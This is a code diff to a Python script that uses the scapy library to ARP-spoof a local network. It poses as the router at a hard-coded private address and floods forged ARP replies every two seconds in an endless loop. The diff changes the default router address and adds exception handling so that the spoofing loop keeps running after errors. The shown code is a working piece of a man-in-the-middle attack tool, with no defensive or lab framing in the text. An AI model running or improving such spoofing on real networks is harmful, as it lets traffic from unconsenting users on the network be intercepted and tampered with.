@@ -2,6 +2,7 @@ import threading
 
 from ip_command import IP
 
+from helpers import print_exception
 from scapy.all import *
 from scapy.layers.l2 import ARP
 from scapy.sendrecv import send
@@ -14,7 +15,7 @@ from scapy.sendrecv import send
 # router_ip (str)       - IP address of router on local network, address to spoof
 
 
-def start_arp_spoof(router_ip='172.16.119.1'):
+def start_arp_spoof(router_ip='172.16.119.2'):
 	# get ip addresses of machines on local network
 	print("// ARP SPOOF ========================================")
 	# full_results = [re.findall('^[\w\?\.]+|(?<=\s)\([\d\.]+\)|(?<=at\s)[\w\:]+', i) for i in os.popen('ip n show')]
@@ -35,8 +36,11 @@ def start_arp_spoof(router_ip='172.16.119.1'):
 
 def do_arp_spoof(arp):
 	while True:
-		send(arp)
-		time.sleep(2)
+		try:
+			send(arp)
+			time.sleep(2)
+		except Exception as e:
+			print_exception(str(e))
 
 
 # MAIN ============================================= #
